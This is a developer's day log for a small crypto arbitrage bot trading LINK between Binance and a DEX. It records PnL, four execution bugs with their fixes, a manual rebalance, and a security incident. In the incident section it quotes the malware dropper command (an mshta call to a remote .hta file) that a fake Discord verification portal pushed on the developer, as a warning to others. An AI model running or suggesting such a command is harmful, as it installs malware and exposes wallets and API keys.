# Day 4 — Debugging, Security Incident, Manual Rebalance

**Date:** 2026-05-09

---

## Numbers

| Metric | Value |
|---|---|
| Starting capital | ~$101.92 (end of Day 3) |
| Ending capital | ~$100.04 |
| Real PnL (arb) | +$0.063 (2 trades, PnL display bug made them appear negative) |
| Trades completed | 2 |
| Win rate | 100% |
| Spreads available | 44-50 bps |
| Failed attempts | ~6 (all during bug fixes, no LINK stuck at end) |

**Risk settings:** Day 4 limits (max_trade_usd $15, trade_usd $14.90)

---

## What Happened

Day started with a **security incident**: while looking for Synapse Protocol Discord to recover stuck LINK from Day 3, a fake "Discord verification portal" was encountered. It prompted running `mshta https://guildcred.net/gate.hta` in cmd — a Windows malware dropper. Malwarebytes removed 7 items.

**Response:**
- Revoked Binance API keys immediately (new ones created)
- Created a new MetaMask wallet (`0x442fA034d38479B08F8b39b92A4f6da4C4C72ea7`)
- Emergency liquidated old wallet: sold LINK → USDT, swept to Binance
- Resumed trading from new wallet with new API keys

After the wallet migration, bot was restarted and hit **4 consecutive bugs** before trades executed cleanly:

1. `use_flashbots=True` default → always DEX-first → CEX IOC expired every time (market moved in the 6s DEX confirmation window)
2. `tick_size` miscalculated as 0.977 instead of 0.01 → sell orders placed at $10.70 when bid was $10.47 → IOC expired
3. Unwind used V2 calldata (`38ed1739`) on V3 router → `execution reverted: 0x`
4. Unwind `amount_in` used rounded `leg1_fill_size` (1.42) but actual received was 1.4198... → `STF` (insufficient balance)

Once all 4 were fixed, **2 clean trades executed** with CEX-first approach (sell Binance LINK first, then buy DEX). PnL display showed -$0.10 due to inverted formula for CEX-first, but `check_pnl.py` confirmed actual portfolio gain of +$0.04.

**Manual rebalance performed:**
After 2 trades, Binance LINK was depleted (0.74 remaining) and wallet had accumulated 4.26 LINK. Sent 4.26 LINK from wallet directly to Binance deposit address on Arbitrum One. Transfer confirmed on-chain (50+ L1 confirmations), pending Binance crediting.

---

## Problems Encountered

| Problem | Root Cause | Fix |
|---|---|---|
| Malware attack | Fake Discord verification portal | New wallet + new API keys |
| CEX IOC expired | DEX-first: 6s delay makes signal price stale | Re-fetch current bid before placing order |
| CEX IOC expired (still) | `tick_size=0.977` → order at $10.70 > bid | Fixed ccxt precision parsing (`v<1` = already tick size) |
| Unwind reverted `0x` | V2 calldata on V3 router | Use `exactInputSingle` (selector `414bf389`) for unwind |
| Unwind STF | `amount_in` slightly above actual wallet balance | Cap `amount_in` to on-chain balance before unwind |
| PnL shows -$0.10 | Formula assumed DEX-first; CEX-first inverts sign | Made formula venue-aware: always `(cex_price - dex_price) * size` |
| Synapse bridge LINK stuck | LINK ARB→BSC route not supported by Synapse | Ongoing — contacted Synapse support (2.24 LINK at risk) |

---

## Changes Made

- `executor/engine.py`: `use_flashbots=True` default (reverted to DEX-first after testing CEX-first)
- `executor/engine.py`: Fresh order book fetch before CEX IOC order placement
- `executor/engine.py`: Unwind uses V3 `exactInputSingle` instead of V2 `swapExactTokensForTokens`
- `executor/engine.py`: Unwind caps `amount_in` to actual on-chain token balance
- `executor/engine.py`: `_calculate_pnl` now venue-aware (works for both DEX-first and CEX-first)
- `config/settings.py`: Fixed ccxt precision parsing — treat `v < 1` as tick size directly
- `scripts/arb_bot.py`: Disabled auto-rebalance (manual only)
- `scripts/arb_bot.py`: Added `min_profit_usd=0.03` filter
- `emergency_liquidate.py`: New script — sells all wallet LINK and sweeps USDT to Binance

---

## Lessons Learned

**Four bugs hiding behind each other.** Each fix revealed the next one — use_flashbots → tick_size → unwind V2/V3 → STF. A debugging chain like this is only survivable if you don't lose funds at each step. CEX-first execution helped: no stuck LINK while fixing unwind.

**The tick_size bug was silent for weeks.** Every previous trade succeeded despite `tick_size=0.977` because the stale-price issue was masking it (both were causing IOC expiry). Only when the fresh-price fix was added did the rounding bug become visible.

**Security: fake Discord verification portals are targeted at DeFi users with stuck funds.** Two separate scam attempts on the same day (mshta + msi file). Real protocol support never sends executable files or asks you to run commands.

---

## Tomorrow's Plan (Day 5)

- Confirm Binance credited the 4.26 LINK deposit
- Withdraw $20-30 USDT from Binance to wallet (Arbitrum One) to restore DEX buy capacity
- Resume bot with `--day 4` once inventory is restored
- Target 5+ trades tomorrow to reach 10 total
- Write final report
